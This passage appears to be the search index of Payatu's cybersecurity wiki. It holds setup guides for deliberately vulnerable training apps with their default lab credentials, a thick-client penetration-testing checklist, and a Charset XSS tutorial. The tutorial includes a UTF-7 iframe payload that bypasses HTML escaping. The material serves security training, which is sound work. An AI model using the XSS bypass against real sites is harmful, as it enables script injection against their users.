[{"id":0,"href":"/docs/","title":"Docs","section":"Cyber Security Wiki by Payatu","content":" Categories # Application Security Cloud Security DevSecOps Exploit Development IoT Security Machine Learning Network Red Teaming Threat Modelling "},{"id":1,"href":"/docs/application-security/Vulnerable-Applications/Api/","title":"API","section":"Vulnerable Applications","content":" API application # This Cheat sheet focus on Installing different Vulnerable Web API applications that build with different technology stacks like Java, Nodejs, PHP and Python\nEasier for peoples to download and install in different ways through Docker, Vagrant, VM, Manual, and Host in local machine.\nJava Vulnerable API # Completely ridiculous API [crAPI] Docker git clone https://github.com/OWASP/crAPI.git cd crAPI curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml docker-compose pull docker-compose -f docker-compose.yml --compatibility up -d Browse http://localhost:8888 Vagrant git clone https://github.com/OWASP/crAPI.git cd deploy/vagrant \u0026amp;\u0026amp; vagrant up Browse http://192.168.33.20/ Python Vulnerable API # Damn Vulnerable GraphQL Application\nDocker Image git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git \u0026amp;\u0026amp; cd Damn-Vulnerable-GraphQL-Application docker build -t dvga . docker build -t dvga -f Dockerfile.arm64 . docker run -d -t -p 5013:5013 -e WEB_HOST=0.0.0.0 --name dvga dvga Browse http://localhost:5013/ Docker Hub docker pull dolevf/dvga docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 dolevf/dvga Browse http://localhost:5013/ Host in local machine cd /opt/ git clone [git@github.com](mailto:git@github.com):dolevf/Damn-Vulnerable-GraphQL-Application.git \u0026amp;\u0026amp; cd Damn-Vulnerable-GraphQL-Application pip3 install -r requirements.txt python3 [app.py](http://app.py/) Browse http://localhost:5013/ Payatu Tiredful-API\nDocker git clone https://github.com/payatu/Tiredful-API.git cd Tiredful-API docker build -t tiredful . docker run -p 8000:8000 --name tiredful -it tiredful Browse http://localhost:8000/ PHP Vulnerable API # vAPI\nDocker\ngit clone https://github.com/roottusk/vapi.git cd vapi docker-compose up -d Online Postman\nhttps://www.postman.com/roottusk/workspace/vapi/overview Generic University Vulnerable API\nDocker Hub docker pull busk3r/genericuniversity:latest docker run --name genericuniversity -itd --rm -p 80:8000 busk3r/genericuniversity \u0026amp;\u0026amp; docker exec genericuniversity service mysql start \u0026amp;\u0026amp; docker exec genericuniversity mysql -u root -p -e \u0026quot;ALTER USER 'root'@'localhost' IDENTIFIED BY 'password';” docker exec genericuniversity php /root/Generic-University/artisan serve --host 0.0.0.0 Browse http://localhost Nodejs Vulnerable API # Damn Vulnerable Web Service Docker git clone https://github.com/snoopysecurity/dvws-node.git cd dvws-node docker-compose up Browse http://localhost Manual docker run -d -p 27017-27019:27017-27019 --name dvws-mongo mongo:4.0.4 docker run -p 3306:3306 --name dvws-mysql -e MYSQL_ROOT_PASSWORD=mysecretpassword -e MYSQL_DATABASE=dvws_sqldb -d mysql:8 git clone https://github.com/snoopysecurity/dvws-node.git cd dvws-node sudo apt-get install -y libxml2 libxml2-dev npm install --build-from-source node startup_script.js sudo npm start Browse http://localhost "},{"id":2,"href":"/docs/application-security/Vulnerable-Applications/WebApp/","title":"Web App","section":"Vulnerable Applications","content":" Web application # This Cheat sheet focus on Installing different Vulnerable Web applications that build with different technology stacks like Java, Nodejs, PHP and Python [Contains 30+ Vulnerable Applications]\nEasier for peoples to download and install in different ways through Docker, Vagrant, VM, Manual, and Host in local machine.\nJava Vulnerable Applications # Web Goat Host in local machine download jar file: https://github.com/WebGoat/WebGoat/releases/download/v2023.4/webgoat-2023.4.jar java -jar webgoat\u0026lt;branchname\u0026gt; Browse localhost:8080/WebGoat Register \u0026amp; start practicing Docker docker pull webgoat/goatandwolf docker run -it -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/webgoat Browse http://127.0.0.1:8080/WebGoat As long as we don\u0026rsquo;t remove the container we can use: docker start webgoat Bodgelt Store Docker docker pull psiinon/bodgeit docker run --rm -p 8080:8080 -i -t psiinon/bodgeit Browse http://127.0.0.1:8080/bodgeit As long as we don’t remove the container we can use: docker start bodgeit EasyBuggy Docker Download easybuggy locally docker build . -t easybuggy:local docker run -p 8080:8080 easybuggy:local Browse http://127.0.0.1:8080 To stop https://127.0.0.1:8080/exit Marathon Docker Download locally docker build -f Dockerfile-local -t marathon:latest . If any issues, run npm audit docker run --rm --name marathon-8080 -p 127.0.0.1:8080:8080 --cpu-shares=\u0026quot;256\u0026quot; --memory-reservation=\u0026quot;512m\u0026quot; --memory=\u0026quot;1g\u0026quot; marathon:latest Browse [http://localhost:8080/marathon](http://localhost:8080/marathon) Access the page http://localhost:8080/marathon/showMarathons.page Create account and start hacking OWASP Vulnerable App Docker Clone the repo git clone https://github.com/SasanLabs/VulnerableApp.git cd VulnerableApp docker-compose pull \u0026amp;\u0026amp; docker-compose up Browse http://localhost Host in local machine Download Jar file https://github.com/SasanLabs/VulnerableApp/releases/download/1.11.0/VulnerableApp-1.11.0.jar Navigate to the project directory java -jar VulnerableApp-* Browse http://localhost:9090/VulnerableApp Security Shepherd Docker git clone https://github.com/OWASP/SecurityShepherd.git cd SecurityShepherd sudo gpasswd -a $USER docker mvn -Pdocker clean install -DskipTests docker-compose up Browse http://localhost [admin:password] Virtual Box Download file - https://github.com/OWASP/SecurityShepherd/releases/download/v3.1/owaspSecurityShepherd_v3.1_VM.zip Import the file in VM Start the machine Login with default credentials included in the VM Download .txt file {(user: securityshepherd pass: shepherd3.1)} Check your IP address with ifconfig Browse http://\u0026lt;yourip\u0026gt; Start hacking Vulnerable Java Web application Docker git clone https://github.com/CSPF-Founder/JavaVulnerableLab.git cd JavaVulnerableLab sudo docker-compose up Browse [http://localhost:8080/JavaVulnerableLab/install.jsp](http://localhost:8080/JavaVulnerableLab/install.jsp) Click on the Install button Virtual Box Download file - https://sourceforge.net/projects/javavulnerablelab/files/v0.1/JavaVulnerableLab.ova/download Import the JavaVulnerable.ova into VirtualBox Change the Network Settings to Host-Only Network Start the Machine and Log into the Machine( Credentials→ Username: root, Password: cspf) Start Tomcat by entering \u0026ldquo;service tomcat start\u0026rdquo; in the Terminal Start MySQL by entering \u0026ldquo;service mysql start\u0026rdquo; in the Terminal Find the IP Address of Machine - ifconfig In your Browser, go to \u0026ldquo;http://[IP_ADDRESS_OF_VM]:8080/JavaVulnerableLab/install.jsp Click the Install Button Host in local machine Download Jar file http://sourceforge.net/projects/javavulnerablelab/files/v0.2/JavaVulnerableLab.jar/download Navigate to the project directory Run java -jar JavaVulnerableLab.jar Browse http://localhost:8080/JavaVulnerableLab/install.jsp Nodejs Vulnerable Applications # Juice shop Host it in local Machine\nInstall node.js apt install npm git clone https://github.com/juice-shop/juice-shop.git cd juice-shop npm install npm start Browse to http://localhost:3000 Docker\nInstall Docker - https://docs.docker.com/desktop/install/debian/ Run docker pull bkimminich/juice-shop Run docker run --rm -p 3000:3000 bkimminich/juice-shop Browse to http://localhost:3000 Vagrant\nInstall Vagrant and Virtualbox Run git clone https://github.com/juice-shop/juice-shop.git Run cd vagrant \u0026amp;\u0026amp; vagrant up Browse to 192.168.56.110 Damn Vulnerable Nodejs Application Docker\ndocker run --name dvna -p 9090:9090 -d appsecco/dvna:sqlite Browse http://127.0.0.1:9090/ Docker Hub\ngit clone https://github.com/appsecco/dvna; cd dvna Create one ‘vars.env’ file with this cred MYSQL_USER=dvna MYSQL_DATABASE=dvna MYSQL_PASSWORD=passw0rd MYSQL_RANDOM_ROOT_PASSWORD=yes docker-compose up Browse [http://127.0.0.1:9090/](http://127.0.0.1:9090/) Manual Step\ngit clone https://github.com/appsecco/dvna; cd dvna Configure the environment variables with your database information export MYSQL_USER=dvna export MYSQL_DATABASE=dvna export MYSQL_PASSWORD=passw0rd export MYSQL_HOST=127.0.0.1 export MYSQL_PORT=3306 npm install npm start Access the application at http://localhost:9090 Extreme Vulnerable Node Application Host in local machine Download the zip file - https://github.com/vegabird/xvna/blob/master/xvna.zip Start MongoDB Create DB xvna in MongoDB Import the Collection to MongoDB given from folder collection Start the xvna from root folder using command: node index.js Hit “http://localhost:3000/app” Login Credential: Email-\u0026gt; admin@xvna.com, Password -\u0026gt; password Node Goat Docker git clone https://github.com/OWASP/NodeGoat.git cd NodeGoat docker-compose build docker-compose up Browse http://localhost:4000/ Host in local machine git clone https://github.com/OWASP/NodeGoat.git cd NodeGoat npm install Browse “http://localhost” Snyk’s Goof Docker compose git clone ‣ cd nodejs-goof docker-compose up --build docker-compose down Browse http://localhost:3001/ Docker git clone https://github.com/snyk-labs/nodejs-goof.git cd nodejs-goof docker run --rm -p 27017:27017 mongo:3 Vulnerable Node Docker git clone https://github.com/cr0hn/vulnerable-node.git vulnerable-node cd vulnerable-node/ docker-compose build \u0026amp;\u0026amp; docker-compose up Browse localhost:3000 Start hacking Payatu Vulnerable Nodejs Application Docker git clone https://github.com/payatu/vuln-nodejs-app.git cd ./vuln-nodejs-app docker-compose up --build -d docker-compose up -d Browse http://localhost:9000/ Manual git clone https://github.com/payatu/vuln-nodejs-app.git\ncd ./vuln-nodejs-app\nCreate Database\n$ mysql -u \u0026lt;mysql_user\u0026gt; -p mysql\u0026gt; create database vuln_nodejs_app;\nUpdate your MySQL and MongoDB database username and password inside .env file.\nDB_PORT=3306 DB_NAME=vuln_nodejs_app DB_USER=vuln_nodejs_user DB_PASS=passw0rd HOST_PORT=9000 JWT_SECRET=secret MONGODB_SERVER=localhost MONGODB_ADMINUSERNAME= MONGODB_ADMINPASSWORD= npm install\nnpm run build\nnode server.js\nBrowse http://localhost:9000/\nPHP Vulnerable Applications # Mutillidae Dockerhub images git clone https://github.com/webpwnized/mutillidae-dockerhub.git cd mutilldae-dockerhub Installation → https://docs.docker.com/compose/install/ docker-compose up Now browse “http://127.0.0.1“ Click on ‘Reset DB’ button Port 80, 8080: Mutillidae HTTP web interface Port 81: MySQL Admin HTTP web interface Port 82: LDAP Admin web interface Port 443: HTTPS web interface Port 389: LDAP interface Import ldap file in web application at port 82 (https://github.com/webpwnized/mutilidae/blob/master/configuration/openldap/mutilidae.ldif) Docker git clone [https://github.com/webpwnized/mutillidae-docker.git](https://github.com/webpwnized/mutillidae-dockerhub.git) cd mutilldae-docker docker-compose up Now browse 127.0.0.1 Port 80, 8080: Mutillidae HTTP web interface Port 81: MySQL Admin HTTP web interface Port 82: LDAP Admin web interface Port 443: HTTPS web interface Port 389: LDAP interface XAMPP Download and Install XAMPP https://www.apachefriends.org/download.html cd Downloads chmod +x xampp-linux-x64-8.2.4-0-installer.run ./xampp-linux-x64-8.2.4-0-installer.run Take note that XAMPP is installed on /opt/lampp Now download Mutillidae (https://github.com/webpwnized/mutillidae) Copy the entire Mutillidae directory to /opt/lampp/htdocs cp -r mutillidae /opt/lampp/htdocs Change directory to /opt/lampp cd /opt/lampp Start the XAMPP sudo ./xampp start Now browse http://[Kalilinx IP Address]/mutillidae bWAPP XMAPP Download and Install XMAPP https://www.apachefriends.org/download.html cd Downloads chmod +x xampp-linux-x64-8.2.4-0-installer.run ./xampp-linux-x64-8.2.4-0-installer.run Take note that XAMPP is installed on /opt/lampp Now download bWAPP cp -r bWAPP /opt/lampp/htdocs start the xmapp sudo ./xampp start Now browse http://[Kalilinx IP Address]/mutillidae Virtual box Download the bWAPP https://sourceforge.net/projects/bwapp/files/bee-box/ Extract the zip file Open Virtualbox. Add new machine. Select the machine folder (to store VM files) and input name for the new machine. Choose Type → Linux, 64-bit Next and choose Use an existing hard disk and choose the folder for download BeeBox file. Now choose bwapp.vmdk in Hard disk selector Start and Run DVWA XAMPP Linux Download and Install XAMPP https://www.apachefriends.org/download.html cd Downloads chmod +x xampp-linux-x64-8.2.4-0-installer.run ./xampp-linux-x64-8.2.4-0-installer.run Take note that XAMPP is installed on /opt/lampp Now download DVWA (https://github.com/digininja/DVWA) Copy the complete DVWA directory to /opt/lampp/htdocs → cp -r dvwa /opt/lampp/htdocs Change the directory to /opt/lampp Start the XAMPP sudo ./xampp start Now browse http://[Kalilinx IP Address]/dvwa Local machine git clone https://github.com/digininja/DVWA.git mv DVWA /var/www/html service apache2 start Might be required to use ‘sudo’ Now browse localhost/DVWA in Web browser Shows error cd /var/www/html cd DVWA cp config/config.inc.php.dist config/config.inc.php service mariadb start Type sql and click enter → sql Enter the queries in the database mysql\u0026gt; create database dvwa; create user dvwa@localhost identified by 'p@ssw0rd'; grant all on dvwa.* to dvwa@localhost; mysql\u0026gt; flush privileges; Now the login page will be visible and access localhost/DVWA/login.php Docker Download DVWA https://github.com/digininja/DVWA#download Extract the file cd DVWA docker compose up -d Now browse http://localhost:4280 WackoPicko Docker docker run -p 127.0.0.1:8080:80 -it adamdoupe/wackopicko Browse localhost:8080 Bricks UWAMP Download UWAMP - https://www.uwamp.com/file/UwAmp.rar Download Bricks - https://sechow.com/bricks/download.html Unzip both Move the bricks folder to ‘uwamp’ Open uwamp and start \u0026amp; click phpmyadmin Create new database named Bricks Now access the “http://localhost/bricks” Start hacking Follow link : https://www.youtube.com/watch?v=hcKAKu5FIhM Conviso Vulnerable Web Application [CVWA] Docker git clone https://github.com/convisolabs/CVWA cd CVWA docker build -t cvwa . docker container run -ti -p 8080:80 cvwa Browse http://localhost:8080/site/index.php Deliberately Insecure Web Application [DIWA] Host in local machine git clone ‣ cd diwa composer install cd app php -S 127.0.0.1:80 -t . Browse http://localhost Docker git clone ‣ cd diwa docker build -t diwa . docker run -p 8080:80 -d diwa:latest Browse http://localhost:8080/ OSTE Host in local machine git clone https://github.com/OSTEsayed/OSTE-Vulnerable-Web-Application.git Copy the entire directory to /opt/lampp/htdocs cp -r OSTE-Vulnerable-Web-Application /opt/lampp/htdocs Change the directory cd /opt/lampp Start the XAMPP sudo ./xampp start Now browse http://\u0026lt;Kali IP Address\u0026gt;/OSTE-Vulnerable-Web-Application SSRF Vulnerable App Docker git clone https://github.com/incredibleindishell/SSRF_Vulnerable_Lab.git cd SSRF_Vulnerable_Lab docker build . docker run -p 9000:80 Browse http://localhost:9000 Unsafe Bank Host in local machine git clone https://github.com/lucideus-repo/UnSAFE_Bank.git cd UnSAFE_Bank/Backend docker-compose up -d Browse (http://localhost:3000)` VulnLab Docker docker run --name vulnlab -d -p 1337:80 yavuzlar/vulnlab:latest Browse [http://localhost:1337/](http://localhost:1337/) Manual git clone https://github.com/Yavuzlar/VulnLab cd Vulnlab docker build -t yavuzlar/vulnlab . docker run -d -p 1337:80 yavuzlar/vulnlab Browse [http://localhost:1337/](http://localhost:1337/) Xtreme Vulnerable Web Application [XVWA] Docker sudo docker run --name xvwa -d -p 80:80 tuxotron/xvwa Browse http://localhost/xvwa Automatic installation Scripts Run this bash script in root folder - https://github.com/s4n7h0/Script-Bucket/blob/master/Bash/xvwa-setup.sh Browse http://localhost/xvwa Manual Clone the repo https://github.com/s4n7h0/xvwa Move it to your webserver path Database configuration - xvwa/config.php Browse http://localhost/xvwa/ Reset or setup - http://localhost/xvwa/setup/ Python Vulnerable Applications # Damn Small Vulnerable Web [DSVW] Run in Host machine git clone https://github.com/stamparm/DSVW.git cd DSVW pip install -r requirements.txt python3 dsvw.py Browse http://localhost:65412 Damn Vulnerable Python Web App [DVPWA] Docker git clone https://github.com/anxolerd/dvpwa.git cd dvpwa pip install -r requirements.txt docker-compose up -d Browse http://localhost:8080/ Pygoat Docker docker pull pygoat/pygoat:latest docker run --rm -p 8000:8000 pygoat/pygoat:latest Browse http://127.0.0.1:8000/ Docker Compose git clone https://github.com/adeyosemanputra/pygoat.git cd pygoat docker-compose up -d Browse http://127.0.0.1:8000/ Docker Image git clone https://github.com/adeyosemanputra/pygoat.git cd pygoat docker build -f Dockerfile -t pygoat . docker run --rm -p 8000:8000 pygoat:latest Browse http://127.0.0.1:8000/ Manual git clone https://github.com/adeyosemanputra/pygoat.git cd pygoat pip install -r requirements.txt python3 [manage.py](http://manage.py/) migrate python3 [manage.py](http://manage.py/) runserver Browse http://127.0.0.1:8000/ Vulnerable SAML App Docker git clone https://github.com/yogisec/VulnerableSAMLApp.git cd VulnerableSAMLApp docker-compose up Browse http://127.0.0.1:8000/ Direct Online Practice # Acunetix Altoro Mutual BGA Vulnerable BANK App Cyber Scavenger Hunt Defend the Web Gin \u0026amp; Juice Shop Gruyere HackThisSite HackXpert HackYourselfFirst Hacking Lab Netsparker Test App .NET Netsparker Test App PHP OWASP Juice Shop Security Tweets Zero Bank hackxor "},{"id":3,"href":"/docs/application-security/web/charset-xss/","title":"Charset XSS","section":"Web","content":" Charset XSS # Charset XSS is useful in cases where application filters HTML special characters like \u0026lt; \u0026amp; \u0026gt;, You might have seen these characters converting back into \u0026amp;gt; \u0026amp; \u0026amp;lt; respectively.\nFor example consider the following codes\n\u0026lt;?php if(isset($_GET[\u0026#39;xss\u0026#39;])) { echo htmlspecialchars($_GET[\u0026#39;xss\u0026#39;]); } ?\u0026gt; and similarly for DOM XSS code\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;test page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var bad_string = window.location.hash.substring(1); var regex = /\u0026lt;\\\u0026gt;/gi; var good_string = bad_string.replace(regex,\u0026#39;\u0026#39;) document.write(good_string); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; using charset XSS it is possible to bypass html special characters filtration\nRequirements # Target site not implemented charset Target site implemented the wrong charset Example works in IE-11 # Consider the same DOM XSS code\nxss.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;test page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var bad_string = window.location.hash.substring(1); var regex = /\u0026lt;\\\u0026gt;/gi; var good_string = bad_string.replace(regex,\u0026#39;\u0026#39;) document.write(good_string); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.\niframe.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-7\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026#34;http://lab.com:8888/common/c.html#\u0026lt;p\u0026gt;+ADw-svg/onload+AD0-alert(1444444)+AD4-\u0026lt;/p\u0026gt;\u0026#34; frameborder=\u0026#34;1\u0026#34; height=\u0026#34;300\u0026#34; width=\u0026#34;500\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As soon as we access iframe.html we triage javaScript code execution since xss.html doesn\u0026rsquo;t have any charset defined and hence browser inherit top frame\u0026rsquo;s charset which is UTF-7.\n"},{"id":4,"href":"/docs/application-security/thick-client/checklist/","title":"Checklist","section":"Thick Client","content":" Checklist # Reconnaisance (Information Gathering) # Information Gathering (via tool like CFF Explorer) (https://www.hackingarticles.in/thick-client-penetration-testing-information-gathering/) Identify architecture - Two-tier or Three-tier (https://medium.com/@GacheruEvans/2-tier-vs-3-tier-architecture-26db56fe7e9c) Is the App - Internet or Intranet based (via tool like Wireshark) (https://powell-software.com/resources/blog/difference-between-intranet-and-internet/) Identify - Proxy-aware or Proxy-Unaware (https://www.browserstack.com/docs/app-live/troubleshooting/proxy-aware) Identify technologies used on Client-Side Identify technologies used on Server-Side Identify the Proccess ID (https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/finding-the-process-id, https://www.geeksforgeeks.org/get-process-id-of-linux-foreground-and-background-processes/) Identify application entry points Identify user roles Identify Network Communication - Ports and Protocols in use (https://www.hackingarticles.in/thick-client-penetration-testing-information-gathering/) Port Scanning (via tool like Nmap) (https://www.freecodecamp.org/news/what-is-nmap-and-how-to-use-it-a-tutorial-for-the-greatest-scanning-tool-of-all-time/) Check for webapp associated with the thick client Check whether thick client app redirects to a web application Injection # OS Command Injection SQL Injection NoSQL Injection External XML Entity (XXE) XSS (Cross Site Scripting) HTML Injection XPath Injection LDAP Injection Host Header Injection CSV Injection (HTTP) Parameter Pollution Server-Side Template Injection (SSTI) Broken Authentication and Session Management # Vulnerable Authentication Flow via Response Manipulation (https://medium.com/@MAALP/authentication-bypass-using-response-manipulation-6c33eb1257ac) via SQL/NoSQL Injection (https://portswigger.net/support/using-sql-injection-to-bypass-authentication) Via Null (Absence of) Password (https://owasp.org/www-community/vulnerabilities/Empty_String_Password) Use of Default Credentials (https://rohit443.medium.com/using-default-credential-to-admin-account-takeover-677e782ff2f2) Use of Hardcoded Credentials (https://infosecwriteups.com/go-code-review-1-hard-coded-credentials-are-security-sensitive-4317a8431eaa) Via Memory Manipulation (https://abhigowdaa.medium.com/sensitive-information-in-hexdump-bb6a6306532c) Via Registry Manipulation (https://abhigowdaa.medium.com/passwords-in-registry-entry-30e69fb6524f) Username Enumeration (https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses) Weak Lock Out Mechanism (https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism) Flawed Brute-Force Protection (https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block) Vulnerable Remember Password (https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password) Weak Password Policy (https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy) Flawed User Registration Process (https://sm4rty.medium.com/hunting-for-bugs-in-sign-up-register-feature-2021-c47035481212) OAuth/OpenID (https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1) SSO (https://medium.com/@batuhanaydinn/bug-bounty-hunter-understanding-saml-vulnerabilities-xsw-attacks-8c43c601d2d1) MFA (https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html) Session based weaknesses (https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) Sensitive Data Exposure # Improper cryptographic key management (https://cqr.company/web-vulnerabilities/cryptographic-key-management-issues/) Presence of sensitive data in log files (https://stackify.com/linux-logs/, https://www.solarwinds.com/resources/it-glossary/windows-event-log) Presence of sensitive data in local files (https://www.darkrelay.com/post/thick-client-penetration-testing#:~:text=Testing%20for%20Information%20Leakage) Presence of sensitive data in registry (https://www.netspi.com/blog/technical-blog/thick-application-pentesting/introduction-to-hacking-thick-clients-part-3/) Presence of sensitive data in config files (https://payatu.com/blog/thick-client-penetration-testing/#:~:text=Buffer%20Overflow-,Hardcoded,-Sensitive%20Information%20In) Presence of hard-coded sensitive data in source code (https://www.cyberark.com/resources/threat-research-blog/thick-client-penetration-testing-methodology#:~:text=an%20obfuscation%20process.-,Binary%20Analysis,-After%20we%20have)) Presence of sensitive data in memory (https://www.netspi.com/blog/technical-blog/thick-application-pentesting/introduction-to-hacking-thick-clients-part-6-the-memory/) Sensitive Data Persists in Memory after Formal Logout Improper Cryptography Usage # Missing encryption (https://cwe.mitre.org/data/definitions/311) Use of Weak cryptographic Keys (https://www.thesslstore.com/blog/cryptographic-keys-101-what-they-are-how-they-secure-data/) Weak Cryptography (encryption) algorithm implemented (in Authentication) (https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms) Use of old/less-secure Hashing algorithms (https://cwe.mitre.org/data/definitions/328.html) Use of Hash values without Salting (https://auth0.com/blog/adding-salt-to-hashing-a-better-way-to-store-passwords/) Insufficient randomness for cryptographic functions/keys (https://www.netdata.cloud/blog/understanding-entropy-the-key-to-secure-cryptography-and-randomness/) Improper Authorization (Broken Access Control) # Privilege Escalation (https://delinea.com/blog/windows-privilege-escalation) Via enabling hidden functionalities Via enabling objects (eg. text fields, buttons) Via disabling objects (eg. text fields, buttons) Via Parameter manipulation Weak file/folder permission per user role Read/Write access of the registry Read/Write access of the configuration files Read/Write access of the log files Via Memory Manipulation Via Registry Manipulation Horizontal Privilege Escalation Vertical Privilege Escalation Analyze setuid/setgid permission (https://www.cbtnuggets.com/blog/technology/system-admin/linux-file-permissions-understanding-setuid-setgid-and-the-sticky-bit) Forced Browsing (https://owasp.org/www-community/attacks/Forced_browsing) Insecure Direct Object References (IDOR) (https://portswigger.net/web-security/access-control/idor) URL/Open Redirection (https://portswigger.net/kb/issues/00500100_open-redirection-reflected) Path/Directory Traversal (https://owasp.org/www-community/attacks/Path_Traversal) Read/Write permission for App Directory or Files Tampering cookies/sesssions (https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies) JWT Based Attacks (https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) Security Misconfiguration # Improper Error Handling (verbose messages) Absent/weakly configured security headers (https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) Cross-Origin Resource Sharing (CORS) Misconfiguration (https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/07-Testing_Cross_Origin_Resource_Sharing) Server Banner Information Disclosure (https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server) HTTP Request Smuggling (https://portswigger.net/web-security/request-smuggling) Check for unquoted service paths (https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/UnquotedServicePath.md) Unnecessarily exposed features (ports, services, pages, accounts, or privileges). CAPTCHA Unicode Normalization (https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization) Path normalization issues Unrestricted File Upload (https://book.hacktricks.xyz/pentesting-web/file-upload) Insecure Communication # Sensitive data transmitted in plain text (eg. Database Queries) (https://docs.guardrails.io/docs/vulnerability-classes/insecure-network-communication/cleartext-transmission) Usage of plaintext communication protocols (eg. FTP, TELNET, HTTP, MQTT, WS) (https://www.pcisecuritystandards.org/glossary/insecure-protocol-service-port/) SSL Vulnerabilities (https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html) Weak SSL/DTLS cipher (https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_SSL_TLS_Ciphers_Insufficient_Transport_Layer_Protection) Weak SSL/DTSL protocol SSL cipher expired/about to expire Self signed certificate Certificate signed with a weak hashing algorithm Insecure implementation of certificate validation HTTPS not enabled HTTPS not enforced Analyze and/or bypass firewall rules Poor Code Quality # Verify StrongNaming (signing an assembly with a key) (https://learn.microsoft.com/en-us/dotnet/standard/assembly/strong-named) Check for missing Code-Signing and Verification checks (for File Integrity) (https://en.wikipedia.org/wiki/Code_signing) Reverse Engineering (https://rahulmondal666.medium.com/learning-thick-client-vapt-with-me-part-3-patching-the-application-by-reverse-engineering-e231ca6bfa34) Decompile the application Rebuild the application Patch the application Bypass licence/validation check Race Condition (https://book.hacktricks.xyz/pentesting-web/race-condition) Lack Of Binary Protections (https://blog.securelayer7.net/static-analysismemory-forensics-reverse-engineering-thick-client-penetration-testing-part-4/) Check for HighEntropyVA (https://learn.microsoft.com/en-us/cpp/build/reference/highentropyva?view=msvc-170) Is ASLR (Address Space Layout Randomization) enabled (https://blog.securelayer7.net/static-analysismemory-forensics-reverse-engineering-thick-client-penetration-testing-part-4/) Is DEP (Data Execution Prevention) enabled Is SafeSEH (Safe Structured Exception Handlers) enabled Is CFG (Control Flow Guard) enabled Lack of Code Obfuscation (https://payatu.com/blog/thick-client-penetration-testing/#Lack_of_code_obfuscation) DLL Injection (https://www.upguard.com/blog/dll-hijacking, https://attack.mitre.org/techniques/T1055/001/) DLL proxying (https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence) Buffer Overflow Stack Buffer Overflow (https://en.wikipedia.org/wiki/Stack_buffer_overflow) Heap Buffer Overflow (https://en.wikipedia.org/wiki/Heap_overflow) Using Components with known vulnerabilities # Using Component with Known Vulnerabilities (https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities) Using unmaintained/obsolete libraries Insufficient logging and monitoring # Logs (containing sensitive data) publiclly available (https://seminar.vercel.app/ch5/SecurityMisconfig/logs.html) Log Injection/Forging (https://owasp.org/www-community/attacks/Log_Injection) Logging Sensitive information (https://cwe.mitre.org/data/definitions/532) Lack of logging important information (https://www.paloaltonetworks.com/cyberpedia/insufficient-logging-visibility-cicd-sec10) Side Channel Data Leaks (https://www.infosecinstitute.com/resources/hacking/android-hacking-security-part-4-exploiting-unintended-data-leakage-side-channel-data-leakage/) Miscellaneous # Application Debuggable Analyze the Dump File Business Logic (Application Specific) Bypassing license/extending lifetime of trial software via register manipulation Payment Manipulation String based analysis Server-Side attacks SSRF Local File Inclusion (LFI) Remote File Inclusion (RFI) Denial Of Service attack (DOS) "},{"id":5,"href":"/contribute/","title":"Contribute","section":"Cyber Security Wiki by Payatu","content":" Contribute # Hey There! Looks like you are here for contributing to the wiki\u0026hellip;Let me help you with a few pointers!\nThe aim of this open-source project to create a central repository for all the cybersecurity content, which can be consumed by security researchers and newbies in the field. You can add content related to any field and this is also a great place to showcase the content you have created. The scope of the project is whatever you think can help out folks get started in the cyber security. We have hosted everything on to Github, click on the button and it will take you to Github Contribute Structure # The structure is required for uniformity, so here are a few template, to help you curate the content.\nThe _index.md file acts as the index for that specific directory. To add a new category A category is the high level overview. For example - \u0026ldquo;Application Security\u0026rdquo; is a category.\nSteps - Create a new 